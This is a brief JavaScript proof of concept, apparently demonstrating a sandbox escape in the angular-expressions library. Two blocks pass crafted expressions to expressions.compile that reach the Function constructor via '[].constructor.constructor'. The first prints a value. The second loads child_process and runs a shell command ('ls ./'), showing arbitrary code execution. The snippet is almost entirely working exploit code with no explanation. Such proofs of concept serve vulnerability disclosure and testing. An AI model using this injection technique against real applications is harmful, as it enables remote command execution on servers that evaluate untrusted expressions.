var expressions = require("angular-expressions");
// x = console.log;
evaluate = expressions.compile(`[].constructor.constructor('console.log(123)')()`);
a = evaluate()

var expressions = require("angular-expressions");
// x = console.log;
evaluate = expressions.compile(`[].constructor.constructor('require("child_process").exec("ls ./");')()`);
a = evaluate()